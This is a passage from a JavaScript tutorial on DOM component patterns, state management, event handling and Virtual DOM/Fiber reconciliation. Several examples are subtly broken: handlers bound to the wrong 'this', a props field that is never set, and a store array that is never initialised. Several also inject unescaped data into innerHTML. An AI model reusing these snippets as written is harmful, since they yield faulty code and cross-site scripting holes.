          await this.processQueue(this.queue.normal);
          await this.processQueue(this.queue.low);
        }, 1000);
      }
    });
  }
  
  async processQueue(queue) {
    for (const component of queue) {
      await component.hydrate();
    }
  }
  
  hydrateComponent(element) {
    const type = element.dataset.component;
    // Attach event listeners and state management
    // without re-rendering the initial HTML
  }
}
```

#### Streaming Content Enhancement

Enhance content as it streams into the DOM.

```javascript
// Progressive content streaming
async function streamContent(url, container) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    buffer += decoder.decode(value, { stream: true });
    
    // Process complete elements from buffer
    const lastCloseTag = buffer.lastIndexOf('</');
    if (lastCloseTag === -1) continue;
    
    const nextCloseTag = buffer.indexOf('>', lastCloseTag);
    if (nextCloseTag === -1) continue;
    
    const completeHTML = buffer.substring(0, nextCloseTag + 1);
    buffer = buffer.substring(nextCloseTag + 1);
    
    // Insert and enhance
    const temp = document.createElement('div');
    temp.innerHTML = completeHTML;
    
    Array.from(temp.children).forEach(child => {
      container.appendChild(child);
      enhanceElement(child);
    });
  }
}
```

### Error Handling and Fallbacks

#### Graceful Feature Degradation

[Inference] When enhancement features fail, the application should fall back to baseline functionality rather than breaking.

```javascript
// Wrap enhancements in try-catch with fallbacks
function safeEnhance(element, enhancer) {
  try {
    enhancer(element);
  } catch (error) {
    console.warn('Enhancement failed, using baseline:', error);
    // Element still functions with HTML/CSS baseline
  }
}

// Test enhancement before applying
function conditionallyEnhance(element, feature, enhancer) {
  if (supportsFeature(feature)) {
    try {
      enhancer(element);
      element.dataset.enhanced = feature;
    } catch (error) {
      console.warn(`Failed to enhance with ${feature}:`, error);
    }
  }
}

function supportsFeature(feature) {
  const tests = {
    'customElements': 'customElements' in window,
    'shadowDOM': 'attachShadow' in Element.prototype,
    'webAnimations': typeof Element.prototype.animate === 'function',
    'intersectionObserver': 'IntersectionObserver' in window,
    'resizeObserver': 'ResizeObserver' in window
  };
  
  return tests[feature] || false;
}
```

#### Network Resilience

[Inference] Progressive enhancement should account for unreliable network conditions.

```javascript
// Optimistic UI with rollback
async function submitWithOptimisticUpdate(form, optimisticUpdate, rollback) {
  const formData = new FormData(form);
  
  // Apply optimistic update immediately
  optimisticUpdate();
  
  try {
    const response = await fetch(form.action, {
      method: form.method,
      body: formData
    });
    
    if (!response.ok) {
      throw new Error('Submission failed');
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    // Rollback on failure
    rollback();
    
    // Show error to user
    const errorMsg = form.querySelector('[role="alert"]');
    if (errorMsg) {
      errorMsg.textContent = 'Submission failed. Please try again.';
    }
    
    throw error;
  }
}

// Retry with exponential backoff
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      return response;
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Testing Progressive Enhancement

#### Feature Detection Testing

[Inference] Progressive enhancement requires testing both enhanced and baseline experiences.

```javascript
// Test helper for simulating capability absence
function withoutFeature(feature, test) {
  const original = window[feature];
  
  try {
    window[feature] = undefined;
    test();
  } finally {
    window[feature] = original;
  }
}

// Usage in tests
withoutFeature('IntersectionObserver', () => {
  const component = createComponent();
  // Verify component still functions
  expect(component.isVisible()).toBe(true);
});
```

#### DOM State Verification

Testing should verify that DOM state is correctly maintained as enhancement layers are added.

```javascript
// Test progressive form enhancement
function testFormEnhancement() {
  const form = document.createElement('form');
  form.innerHTML = `
    <input name="email" type="email" required>
    <button type="submit">Submit</button>
  `;
  
  // Test baseline: form works without JS
  const submitEvent = new Event('submit', { cancelable: true });
  const submitted = form.dispatchEvent(submitEvent);
  expect(submitted).toBe(true);
  
  // Test enhanced: validation prevents invalid submission
  enhanceFormValidation(form);
  const emailInput = form.querySelector('[name="email"]');
  emailInput.value = 'invalid-email';
  
  const enhancedSubmit = new Event('submit', { cancelable: true });
  const enhancedSubmitted = form.dispatchEvent(enhancedSubmit);
  expect(enhancedSubmitted).toBe(false);
  expect(emailInput.getAttribute('aria-invalid')).toBe('true');
}
```

This covers the core patterns and strategies for progressive enhancement using DOM and JavaScript APIs, focusing on practical implementation approaches that maintain baseline functionality while adding enhanced experiences.

---

# Modern DOM Patterns

## Component-Based Thinking

### Mental Model Shifts

Component-based thinking requires viewing the DOM not as a static document tree but as a composition of isolated, reusable units. Each component encapsulates its own structure, behavior, and state, operating as a self-contained system that communicates through well-defined interfaces.

The fundamental shift is from imperative DOM manipulation ("find this element, change this attribute") to declarative composition ("this component renders this state"). You stop thinking about individual DOM operations and start thinking about state transitions that trigger rendering.

### Component Anatomy

#### State Management

State represents the component's internal data that determines its rendering. State should be:

- **Minimal**: Derive computed values rather than storing them
- **Normalized**: Avoid nested duplication; store references instead
- **Serializable**: Enable debugging, time-travel, and persistence
- **Immutable**: Replace rather than mutate for predictable change detection

```javascript
// Poor state design
const state = {
  user: { name: 'Alice', age: 30 },
  userName: 'Alice', // duplicated
  isAdult: true // derived, shouldn't be stored
};

// Better state design
const state = {
  user: { name: 'Alice', age: 30 }
};
const isAdult = state.user.age >= 18; // computed on demand
```

#### Props vs State

Props flow downward from parent to child and are immutable from the child's perspective. State is internal and mutable within the component. The distinction determines component boundaries:

- **Props**: Configuration, data passed in, callbacks from parent
- **State**: Internal UI state, user input, derived local data

A component receiving data via props is more reusable; a component managing state is more autonomous. The tradeoff defines component responsibility.

#### Lifecycle Considerations

Component lifecycle in vanilla JS requires manual management:

- **Mount**: Insert into DOM, attach events, initiate subscriptions
- **Update**: Re-render when state/props change, diff DOM efficiently
- **Unmount**: Remove from DOM, detach events, clean subscriptions

Without a framework, you must track these phases explicitly:

```javascript
class Component {
  constructor(props) {
    this.props = props;
    this.state = {};
    this.element = null;
    this.subscriptions = [];
  }

  mount(container) {
    this.element = this.render();
    container.appendChild(this.element);
    this.attachEvents();
    this.subscriptions.push(
      eventBus.subscribe('dataChange', this.handleDataChange)
    );
  }

  update(newProps) {
    this.props = { ...this.props, ...newProps };
    const newElement = this.render();
    this.element.replaceWith(newElement);
    this.element = newElement;
    this.attachEvents();
  }

  unmount() {
    this.subscriptions.forEach(unsub => unsub());
    this.element.remove();
    this.element = null;
  }
}
```

### Rendering Strategies

#### String-Based Rendering

Generate HTML strings and inject via `innerHTML`. Fast for initial renders but requires full re-renders for updates:

```javascript
function render(state) {
  return `
    <div class="counter">
      <button data-action="decrement">-</button>
      <span>${state.count}</span>
      <button data-action="increment">+</button>
    </div>
  `;
}

container.innerHTML = render(state);
```

**Tradeoffs**: Simple, fast initial render, loses event listeners on re-render, no granular updates, vulnerable to XSS if state contains user input.

#### DOM API Rendering

Imperatively create and manipulate elements:

```javascript
function render(state) {
  const div = document.createElement('div');
  div.className = 'counter';
  
  const decBtn = document.createElement('button');
  decBtn.textContent = '-';
  decBtn.onclick = () => dispatch({ type: 'DECREMENT' });
  
  const span = document.createElement('span');
  span.textContent = state.count;
  
  const incBtn = document.createElement('button');
  incBtn.textContent = '+';
  incBtn.onclick = () => dispatch({ type: 'INCREMENT' });
  
  div.append(decBtn, span, incBtn);
  return div;
}
```

**Tradeoffs**: Verbose, safer (no XSS), retains references, enables targeted updates, but requires manual diffing for efficiency.

#### Virtual DOM Diffing

Maintain a lightweight representation of the DOM, diff against previous version, apply minimal changes:

```javascript
function diff(oldVNode, newVNode, parent, index = 0) {
  if (!oldVNode) {
    parent.appendChild(render(newVNode));
  } else if (!newVNode) {
    parent.removeChild(parent.childNodes[index]);
  } else if (changed(oldVNode, newVNode)) {
    parent.replaceChild(render(newVNode), parent.childNodes[index]);
  } else if (newVNode.type) {
    const oldChildren = oldVNode.children || [];
    const newChildren = newVNode.children || [];
    const maxLength = Math.max(oldChildren.length, newChildren.length);
    
    for (let i = 0; i < maxLength; i++) {
      diff(oldChildren[i], newChildren[i], parent.childNodes[index], i);
    }
  }
}
```

**[Inference]**: This approach likely reduces unnecessary DOM operations compared to full re-renders, but the actual performance gain depends on component complexity and update frequency.

### Event Handling Patterns

#### Event Delegation

Attach a single listener to a parent element and route events based on target:

```javascript
class TodoList {
  constructor(element) {
    this.element = element;
    this.element.addEventListener('click', this.handleClick.bind(this));
  }

  handleClick(e) {
    const target = e.target;
    
    if (target.matches('[data-action="toggle"]')) {
      const id = target.closest('[data-todo-id]').dataset.todoId;
      this.toggleTodo(id);
    } else if (target.matches('[data-action="delete"]')) {
      const id = target.closest('[data-todo-id]').dataset.todoId;
      this.deleteTodo(id);
    }
  }
}
```

**Benefits**: Memory efficient (fewer listeners), works with dynamically added elements, centralizes event logic.

#### Synthetic Events

[Inference] Frameworks often normalize browser event differences into a unified interface. In vanilla JS, you manually handle cross-browser quirks:

```javascript
function normalizeWheelDelta(e) {
  if (e.deltaY) return e.deltaY;
  if (e.wheelDelta) return -e.wheelDelta;
  if (e.detail) return e.detail * 40;
  return 0;
}
```

### State Composition Patterns

#### Lifting State Up

When multiple components need shared state, move state to their nearest common ancestor:

```javascript
class Parent {
  constructor() {
    this.state = { selectedId: null };
  }

  render() {
    return `
      ${Sidebar({ 
        selectedId: this.state.selectedId,
        onSelect: id => this.setState({ selectedId: id })
      })}
      ${Content({ 
        selectedId: this.state.selectedId 
      })}
    `;
  }
}
```

#### Derived State

Compute values from existing state rather than storing them:

```javascript
class FilteredList {
  constructor(items) {
    this.state = {
      items,
      filter: '',
      sortBy: 'name'
    };
  }

  // Compute on demand, don't store
  get filteredItems() {
    return this.state.items
      .filter(item => item.name.includes(this.state.filter))
      .sort((a, b) => a[this.state.sortBy].localeCompare(b[this.state.sortBy]));
  }
}
```

#### Reducer Pattern

Consolidate state updates into a single function that processes actions:

```javascript
function reducer(state, action) {
  switch (action.type) {
    case 'ADD_TODO':
      return {
        ...state,
        todos: [...state.todos, { id: Date.now(), text: action.text, done: false }]
      };
    case 'TOGGLE_TODO':
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.id ? { ...todo, done: !todo.done } : todo
        )
      };
    case 'DELETE_TODO':
      return {
        ...state,
        todos: state.todos.filter(todo => todo.id !== action.id)
      };
    default:
      return state;
  }
}
```

### Component Communication

#### Props Drilling

Pass data through intermediate components that don't need it:

```javascript
function App() {
  const user = getCurrentUser();
  return Container({ user });
}

function Container({ user }) {
  return Sidebar({ user }); // Container doesn't use user
}

function Sidebar({ user }) {
  return UserProfile({ user }); // Sidebar doesn't use user
}

function UserProfile({ user }) {
  return `<div>${user.name}</div>`; // Finally used here
}
```

**Problems**: Tight coupling, maintenance burden, intermediate components become dependent on data they don't use.

#### Event Bus Pattern

Decouple components via publish-subscribe:

```javascript
class EventBus {
  constructor() {
    this.events = {};
  }

  subscribe(event, callback) {
    if (!this.events[event]) this.events[event] = [];
    this.events[event].push(callback);
    return () => this.unsubscribe(event, callback);
  }

  unsubscribe(event, callback) {
    if (!this.events[event]) return;
    this.events[event] = this.events[event].filter(cb => cb !== callback);
  }

  emit(event, data) {
    if (!this.events[event]) return;
    this.events[event].forEach(callback => callback(data));
  }
}

const bus = new EventBus();

// Component A
bus.emit('userLoggedIn', { id: 123, name: 'Alice' });

// Component B (anywhere in the tree)
bus.subscribe('userLoggedIn', user => {
  console.log(`Welcome ${user.name}`);
});
```

**Tradeoffs**: Loose coupling, but harder to trace data flow, can lead to callback hell, memory leaks if unsubscribe is forgotten.

#### Context/Provider Pattern

Make data available to subtree without explicit passing:

```javascript
class Context {
  constructor(defaultValue) {
    this.value = defaultValue;
    this.subscribers = new Set();
  }

  provide(value) {
    this.value = value;
    this.subscribers.forEach(callback => callback(value));
  }

  consume(callback) {
    callback(this.value);
    this.subscribers.add(callback);
    return () => this.subscribers.delete(callback);
  }
}

const UserContext = new Context(null);

// Provider component
function App() {
  const user = getCurrentUser();
  UserContext.provide(user);
  return Container();
}

// Consumer component (deep in tree)
function Avatar() {
  let user;
  UserContext.consume(u => user = u);
  return `<img src="${user.avatar}" />`;
}
```

### Composition Techniques

#### Higher-Order Components

Functions that take a component and return an enhanced component:

```javascript
function withLogging(Component) {
  return class extends Component {
    componentDidUpdate(prevProps) {
      console.log('Props changed:', prevProps, '->', this.props);
      super.componentDidUpdate?.(prevProps);
    }
  };
}

function withAuth(Component) {
  return function AuthWrapped(props) {
    const user = getCurrentUser();
    if (!user) return LoginPrompt();
    return Component({ ...props, user });
  };
}

const EnhancedProfile = withAuth(withLogging(UserProfile));
```

#### Render Props

Pass rendering logic as a function prop:

```javascript
class Mouse {
  constructor(element) {
    this.state = { x: 0, y: 0 };
    this.element = element;
    
    element.addEventListener('mousemove', e => {
      this.state = { x: e.clientX, y: e.clientY };
      this.update();
    });
  }

  update() {
    this.element.innerHTML = this.props.render(this.state);
  }
}

// Usage
new Mouse(document.body, {
  render: ({ x, y }) => `
    <div>Mouse position: ${x}, ${y}</div>
  `
});
```

#### Slot Pattern

Define injection points in component template:

```javascript
class Card {
  constructor({ header, body, footer }) {
    this.slots = { header, body, footer };
  }

  render() {
    return `
      <div class="card">
        <div class="card-header">${this.slots.header || ''}</div>
        <div class="card-body">${this.slots.body}</div>
        <div class="card-footer">${this.slots.footer || ''}</div>
      </div>
    `;
  }
}

// Usage
const card = new Card({
  header: '<h3>Title</h3>',
  body: '<p>Content goes here</p>',
  footer: '<button>Action</button>'
});
```

### Performance Optimization

#### Memoization

Cache component output for same inputs:

```javascript
class MemoizedComponent {
  constructor() {
    this.cache = new Map();
  }

  render(props) {
    const key = JSON.stringify(props);
    
    if (this.cache.has(key)) {
      return this.cache.get(key);
    }

    const output = this.computeRender(props);
    this.cache.set(key, output);
    
    // Limit cache size
    if (this.cache.size > 100) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    
    return output;
  }

  computeRender(props) {
    // Expensive rendering logic
    return `<div>${props.data.map(item => `<span>${item}</span>`).join('')}</div>`;
  }
}
```

**[Inference]**: Memoization trades memory for CPU time. Effectiveness depends on render cost vs. serialization cost and prop change frequency.

#### Lazy Initialization

Defer expensive operations until needed:

```javascript
class LazyComponent {
  constructor(props) {
    this.props = props;
    this._expensiveData = null;
  }

  get expensiveData() {
    if (!this._expensiveData) {
      this._expensiveData = this.computeExpensiveData();
    }
    return this._expensiveData;
  }

  computeExpensiveData() {
    // Heavy computation
    return this.props.data.reduce((acc, item) => {
      // Complex processing
      return acc;
    }, {});
  }
}
```

#### Virtualization

Render only visible items in large lists:

```javascript
class VirtualList {
  constructor(container, items, itemHeight) {
    this.container = container;
    this.items = items;
    this.itemHeight = itemHeight;
    this.scrollTop = 0;
    
    container.addEventListener('scroll', () => {
      this.scrollTop = container.scrollTop;
      this.render();
    });
  }

  render() {
    const containerHeight = this.container.clientHeight;
    const startIndex = Math.floor(this.scrollTop / this.itemHeight);
    const endIndex = Math.ceil((this.scrollTop + containerHeight) / this.itemHeight);
    const visibleItems = this.items.slice(startIndex, endIndex);
    
    this.container.innerHTML = `
      <div style="height: ${this.items.length * this.itemHeight}px; position: relative;">
        ${visibleItems.map((item, i) => `
          <div style="position: absolute; top: ${(startIndex + i) * this.itemHeight}px; height: ${this.itemHeight}px;">
            ${item.content}
          </div>
        `).join('')}
      </div>
    `;
  }
}
```

#### Debouncing and Throttling

Control update frequency for expensive operations:

```javascript
function debounce(fn, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => fn.apply(this, args), delay);
  };
}

function throttle(fn, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

class SearchInput {
  constructor(element) {
    this.element = element;
    this.element.addEventListener('input', 
      debounce(e => this.handleSearch(e.target.value), 300)
    );
  }

  handleSearch(query) {
    // Expensive search operation
    fetch(`/api/search?q=${query}`);
  }
}
```

### Component Patterns

#### Container/Presenter Pattern

Separate data management (container) from presentation (presenter):

```javascript
// Container - handles logic and state
class TodoListContainer {
  constructor() {
    this.state = {
      todos: [],
      loading: true
    };
    this.fetchTodos();
  }

  async fetchTodos() {
    const todos = await fetch('/api/todos').then(r => r.json());
    this.state = { todos, loading: false };
    this.render();
  }

  handleToggle(id) {
    this.state.todos = this.state.todos.map(todo =>
      todo.id === id ? { ...todo, done: !todo.done } : todo
    );
    this.render();
  }

  render() {
    return TodoListPresenter({
      todos: this.state.todos,
      loading: this.state.loading,
      onToggle: id => this.handleToggle(id)
    });
  }
}

// Presenter - pure function, only renders
function TodoListPresenter({ todos, loading, onToggle }) {
  if (loading) return '<div>Loading...</div>';
  
  return `
    <ul>
      ${todos.map(todo => `
        <li>
          <input 
            type="checkbox" 
            ${todo.done ? 'checked' : ''}
            data-id="${todo.id}"
            onchange="onToggle(${todo.id})"
          />
          ${todo.text}
        </li>
      `).join('')}
    </ul>
  `;
}
```

#### Compound Components

Components that work together, sharing implicit state:

```javascript
class Tabs {
  constructor() {
    this.state = { activeTab: 0 };
    this.children = [];
  }

  addTab(label, content) {
    this.children.push({ label, content });
  }

  render() {
    return `
      <div class="tabs">
        <div class="tab-list">
          ${this.children.map((tab, i) => `
            <button 
              class="${i === this.state.activeTab ? 'active' : ''}"
              onclick="this.setActiveTab(${i})"
            >
              ${tab.label}
            </button>
          `).join('')}
        </div>
        <div class="tab-panel">
          ${this.children[this.state.activeTab].content}
        </div>
      </div>
    `;
  }

  setActiveTab(index) {
    this.state.activeTab = index;
    this.update();
  }
}

// Usage
const tabs = new Tabs();
tabs.addTab('Overview', '<p>Overview content</p>');
tabs.addTab('Details', '<p>Details content</p>');
tabs.addTab('Settings', '<p>Settings content</p>');
```

#### Controlled vs Uncontrolled

**Controlled**: Component state is managed by parent

```javascript
class ControlledInput {
  constructor({ value, onChange }) {
    this.value = value;
    this.onChange = onChange;
  }

  render() {
    return `
      <input 
        type="text" 
        value="${this.value}"
        oninput="this.onChange(event.target.value)"
      />
    `;
  }
}

// Parent controls the state
class Form {
  constructor() {
    this.state = { name: '' };
  }

  render() {
    return ControlledInput({
      value: this.state.name,
      onChange: name => {
        this.state.name = name;
        this.update();
      }
    });
  }
}
```

**Uncontrolled**: Component manages its own state

```javascript
class UncontrolledInput {
  constructor({ defaultValue }) {
    this.element = document.createElement('input');
    this.element.type = 'text';
    this.element.value = defaultValue || '';
  }

  getValue() {
    return this.element.value;
  }

  render() {
    return this.element;
  }
}

// Parent accesses value via ref
class Form {
  constructor() {
    this.inputRef = new UncontrolledInput({ defaultValue: '' });
  }

  handleSubmit() {
    const name = this.inputRef.getValue();
    console.log('Submitted:', name);
  }
}
```

### State Management Architectures

#### Flux Pattern

Unidirectional data flow: Action → Dispatcher → Store → View

```javascript
class Dispatcher {
  constructor() {
    this.callbacks = [];
  }

  register(callback) {
    this.callbacks.push(callback);
  }

  dispatch(action) {
    this.callbacks.forEach(callback => callback(action));
  }
}

class Store {
  constructor(dispatcher) {
    this.state = {};
    this.listeners = [];
    dispatcher.register(action => this.handleAction(action));
  }

  handleAction(action) {
    switch (action.type) {
      case 'ADD_ITEM':
        this.state.items.push(action.item);
        break;
      case 'REMOVE_ITEM':
        this.state.items = this.state.items.filter(i => i.id !== action.id);
        break;
    }
    this.emitChange();
  }

  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  emitChange() {
    this.listeners.forEach(listener => listener(this.state));
  }

  getState() {
    return this.state;
  }
}

const dispatcher = new Dispatcher();
const store = new Store(dispatcher);

// Component
class ListView {
  constructor() {
    store.subscribe(state => this.render(state));
  }

  addItem(item) {
    dispatcher.dispatch({ type: 'ADD_ITEM', item });
  }
}
```

#### Observable Pattern

State changes trigger reactive updates:

```javascript
class Observable {
  constructor(value) {
    this._value = value;
    this.subscribers = new Set();
  }

  get value() {
    return this._value;
  }

  set value(newValue) {
    if (this._value !== newValue) {
      this._value = newValue;
      this.notify();
    }
  }

  subscribe(callback) {
    this.subscribers.add(callback);
    callback(this._value);
    return () => this.subscribers.delete(callback);
  }

  notify() {
    this.subscribers.forEach(callback => callback(this._value));
  }
}

// Usage
const count = new Observable(0);

class Counter {
  constructor() {
    count.subscribe(value => {
      this.render(value);
    });
  }

  increment() {
    count.value++;
  }

  render(value) {
    this.element.innerHTML = `
      <div>Count: ${value}</div>
      <button onclick="this.increment()">+</button>
    `;
  }
}
```

#### Atomic State Updates

Treat state as immutable, create new references for changes:

```javascript
class ImmutableStore {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = [];
  }

  setState(updater) {
    const prevState = this.state;
    this.state = typeof updater === 'function' 
      ? updater(prevState)
      : { ...prevState, ...updater };
    
    if (this.state !== prevState) {
      this.listeners.forEach(listener => listener(this.state, prevState));
    }
  }

  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
}

const store = new ImmutableStore({ count: 0, items: [] });

store.setState(state => ({
  ...state,
  count: state.count + 1
}));

// Array updates - always create new array
store.setState(state => ({
  ...state,
  items: [...state.items, newItem]
}));

// Nested updates - spread each level
store.setState(state => ({
  ...state,
  user: {
    ...state.user,
    profile: {
      ...state.user.profile,
      name: 'New Name'
    }
  }
}));
```

### Custom Element Pattern

Encapsulate components as native web components:

```javascript
class TodoItem extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
  }

  static get observedAttributes() {
    return ['text', 'done'];
  }

  connectedCallback() {
    this.render();
    this.shadowRoot.querySelector('input').addEventListener('change', () => {
      this.dispatchEvent(new CustomEvent('toggle', {
        detail: { id: this.getAttribute('id') }
      }));
    });
  }

  attributeChangedCallback(name, oldValue, newValue) {
    if (oldValue !== newValue) {
      this.render();
    }
  }

  render() {
    const text = this.getAttribute('text');
    const done = this.hasAttribute('done');

    this.shadowRoot.innerHTML = `
      <style>
        :host { display: block; padding: 8px; }
        .done { text-decoration: line-through; }
      </style>
      <label>
        <input type="checkbox" ${done ? 'checked' : ''} />
        <span class="${done ? 'done' : ''}">${text}</span>
      </label>
    `;
  }
}

customElements.define('todo-item', TodoItem);

// Usage in HTML
// <todo-item text="Buy milk" done></todo-item>
```

### Dependency Injection

Pass dependencies explicitly rather than importing globally:

```javascript
class UserService {
  constructor(httpClient, cache) {
    this.http = httpClient;
    this.cache = cache;
  }

  async getUser(id) {
    const cached = this.cache.get(`user:${id}`);
    if (cached) return cached;

    const user = await this.http.get(`/api/users/${id}`);
    this.cache.set(`user:${id}`, user);
    return user;
  }
}

class UserProfile {
  constructor(userService) {
    this.userService = userService;
  }

  async render(userId) {
    const user = await this.userService.getUser(userId);
    return `<div>${user.name}</div>`;
  }
}

// Wire dependencies
const httpClient = new HttpClient();
const cache = new Cache();
const userService = new UserService(httpClient, cache);
const userProfile = new UserProfile(userService);
```

This approach enables testing, swapping implementations, and clearer component boundaries.

---

## Virtual DOM Concepts

### Core Architecture

The Virtual DOM operates as an in-memory representation of the actual DOM, maintaining a lightweight JavaScript object structure that mirrors the real DOM tree. Each node in the Virtual DOM corresponds to a DOM element, storing properties like tag name, attributes, children, and event handlers without the overhead of actual browser DOM objects.

The representation typically follows a node structure:

```javascript
{
  type: 'div',
  props: {
    className: 'container',
    onClick: handleClick
  },
  children: [
    { type: 'span', props: { children: 'Hello' }, children: [] }
  ]
}
```

### Reconciliation Process

Reconciliation determines the minimal set of changes needed to update the real DOM. The algorithm compares the previous Virtual DOM tree with the new one through a diffing process.

**Tree Diffing Strategy**

The diffing algorithm makes assumptions to achieve O(n) complexity rather than O(n³):

- Elements of different types produce different trees (entire subtree replacement)
- Developers provide keys to identify stable elements across renders
- Sibling elements are compared level-by-level, not across levels

**Element Type Comparison**

When root elements differ in type, the old tree is destroyed and rebuilt:

- Unmount old components and their state
- Mount new components with fresh state
- All children are recursively unmounted

When elements share the same type, the algorithm updates only changed attributes and recurses on children.

**Component Updates**

For component elements of the same type:

- The instance remains the same (state persists)
- Props are updated through component lifecycle methods
- The component's render method generates new Virtual DOM for comparison

### Keys and List Reconciliation

Keys provide stable identity for elements across renders, enabling efficient list updates.

**Without Keys**

The algorithm matches children by index position, causing inefficient updates when items are inserted, removed, or reordered. Inserting an element at the beginning forces updates to all subsequent siblings.

**With Keys**

Keys enable the reconciler to:

- Match elements by identity rather than position
- Detect insertions, deletions, and moves
- Preserve component state tied to specific data items
- Reorder DOM nodes instead of recreating them

**Key Selection Criteria**

Optimal keys are:

- Stable (don't change between renders)
- Unique among siblings
- Predictable (same item produces same key)

Index-as-key defeats the purpose when list order changes, as the key-to-item mapping becomes inconsistent.

### Fiber Architecture

Fiber represents an evolution of Virtual DOM reconciliation, introducing incremental rendering capabilities.

**Fiber Node Structure**

Each fiber is a unit of work representing:

- Component or DOM node
- Link to parent, child, and sibling fibers
- Alternate fiber for double buffering
- Pending props and state
- Effect tags for DOM operations

**Work Phases**

Rendering splits into two phases:

_Render Phase_ (interruptible):

- Build work-in-progress fiber tree
- Calculate differences
- Mark effects
- Can be paused, aborted, or restarted

_Commit Phase_ (synchronous):

- Apply all effects to DOM
- Execute lifecycle methods
- Must complete without interruption

**Priority Scheduling**

Work receives priority levels:

- Immediate (synchronous)
- User-blocking (interactions)
- Normal (data fetches)
- Low (offscreen content)
- Idle (analytics)

Higher priority work can interrupt lower priority work, with partial trees discarded and rebuilt.

### Reconciliation Algorithms

**Stack Reconciler** (Legacy)

The original reconciler processes the tree recursively:

- Synchronous, non-interruptible execution
- Depth-first traversal
- All work completes in single pass
- Long updates block the main thread

**Fiber Reconciler** (Current)

Enables concurrent features:

- Work split into incremental units
- Pause and resume capability
- Priority-based scheduling
- Time-slicing for smooth interactions

### Batching and Updates

**Update Batching**

Multiple state updates within the same event handler are batched:

- State updates are queued, not applied immediately
- Single re-render processes all queued updates
- Prevents unnecessary intermediate renders

**Automatic Batching** (React 18+)

Batching extends beyond event handlers to:

- Promises and async functions
- setTimeout callbacks
- Native event handlers
- Any context wrapped in concurrent features

### Virtual DOM Optimization Strategies

**Bailout Conditions**

The reconciler can skip subtree comparisons when:

- Props haven't changed (shallow comparison)
- Component returns same element reference
- shouldComponentUpdate returns false
- React.memo comparison returns true

**Reference Equality**

Virtual DOM comparisons use shallow equality:

- Object reference comparison, not deep value comparison
- New object references trigger updates even with identical contents
- Stable references (memoization) prevent unnecessary reconciliation

**Children Reconciliation Optimizations**

Special cases for common patterns:

- Single child: direct comparison
- Text content: string comparison without creating text nodes
- Empty children: optimization for conditional rendering

### Effects and Side Effect Management

**Effect Tags**

Fibers are marked with effect flags during reconciliation:

- Placement (insertion)
- Update (property changes)
- Deletion (removal)
- Ref updates
- Lifecycle hooks

**Effect Lists**

Changed fibers form a linked list for efficient commit phase:

- Skip unchanged subtrees
- Process only nodes requiring DOM operations
- Linear traversal instead of tree traversal

### Lane-Based Scheduling

[Inference: Based on React source code patterns] Lanes represent work priority as bit flags:

- Multiple updates tracked simultaneously
- Bitwise operations for efficient priority checks
- Lane merging for batched updates
- Expiration tracking prevents starvation

Different lane categories:

- Sync lanes (immediate updates)
- Default lanes (normal priority)
- Transition lanes (non-urgent updates)
- Retry lanes (error recovery)

### Double Buffering

The system maintains two fiber trees:

- Current tree (displayed on screen)
- Work-in-progress tree (being constructed)

After reconciliation completes:

- Trees swap roles atomically
- Previous work-in-progress becomes current
- Enables consistent UI state during updates

### Concurrent Rendering Considerations

**Time Slicing**

Work is divided into chunks with yields to browser:

- Each chunk processes subset of component tree
- Browser handles events and painting between chunks
- Maintains responsiveness during expensive renders

**Suspense Integration**

Virtual DOM coordinates with Suspense boundaries:

- Incomplete subtrees marked as suspended
- Fallback content rendered immediately
- Tree "commits" once all data resolves

**Transitions**

Transition updates mark non-urgent changes:

- Reconciliation proceeds at lower priority
- Can be interrupted by urgent updates
- Previous UI remains interactive during transition

### Memory and Performance Characteristics

**Memory Overhead**

Virtual DOM introduces:

- JavaScript object allocation for each node
- Additional memory for fiber work structures
- Double buffering duplicates tree in memory

**Performance Trade-offs**

Virtual DOM optimizes for:

- CPU over memory (computation vs. storage)
- Developer convenience over raw performance
- Framework-managed optimization over manual tuning

Direct DOM manipulation can be faster for:

- Simple updates to known elements
- Bulk operations on large lists
- Updates outside reconciliation scope

### Cross-Platform Abstractions

The Virtual DOM concept enables platform-agnostic rendering:

- Renderers implement platform-specific operations
- Core reconciliation remains platform-independent
- Same Virtual DOM drives DOM, Canvas, Native views

**Renderer Interface**

Renderers implement methods for:

- Creating instances from Virtual DOM nodes
- Updating properties and attributes
- Managing parent-child relationships
- Handling event systems
- Text content manipulation

---

## Declarative vs Imperative Approaches

### Core Distinction

Imperative programming specifies _how_ to achieve a result through explicit step-by-step instructions that directly manipulate the DOM. Declarative programming specifies _what_ the desired result should be, abstracting away the implementation details of DOM manipulation.

### Imperative DOM Manipulation

#### Direct DOM Operations

Imperative code explicitly calls DOM APIs to modify the page state:

```javascript
const button = document.createElement('button');
button.textContent = 'Click me';
button.className = 'btn-primary';
button.addEventListener('click', handleClick);
document.body.appendChild(button);
```

Each line represents a discrete operation that must execute in sequence. The developer controls every mutation.

#### State Management Burden

In imperative approaches, the developer manually synchronizes application state with DOM state:

```javascript
let count = 0;
const counter = document.getElementById('counter');

function increment() {
  count++;
  counter.textContent = count; // Manual sync
  
  if (count > 10) {
    counter.classList.add('warning'); // Manual conditional update
  }
}
```

Every state change requires explicit DOM updates. Missing an update creates inconsistency.

#### Workflow Characteristics

- **Explicit sequencing**: Operations execute in programmer-defined order
- **Direct control**: Full access to DOM API methods
- **Manual cleanup**: Event listeners and references must be explicitly removed
- **Imperative conditionals**: if/else statements determine what DOM operations to perform

### Declarative DOM Manipulation

